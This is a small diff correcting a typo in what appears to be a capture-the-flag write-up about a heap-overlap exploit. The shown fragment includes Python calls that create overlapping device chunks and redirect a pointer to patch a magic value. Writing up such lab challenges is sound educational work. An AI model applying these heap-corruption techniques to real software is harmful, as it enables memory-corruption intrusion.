@@ -27,7 +27,7 @@ When we create new device 3 malloc call is invoked, one for device structure (0x
     new_dev(tty,"g","h")             # dev3 with overlapped chunk
 ```
 
-Few things left to get the flag, to make proper jump we need to now dynamic stack frame size for main function, luckly it's just stored at data section by 0x2192 address. Other thing is that we need to replace 0xDEADBEEF to 0xBAADF00D at 0x2000:
+Few things left to get the flag, to make proper jump we need to know dynamic stack frame size for main function, luckly it's just stored at data section by 0x2192 address. Other thing is that we need to replace 0xDEADBEEF to 0xBAADF00D at 0x2000:
 
 ```python
     edit_dev(tty,2,"x","\x01\x01\x01"+"\x01\x20") # set ptr to 0x2001
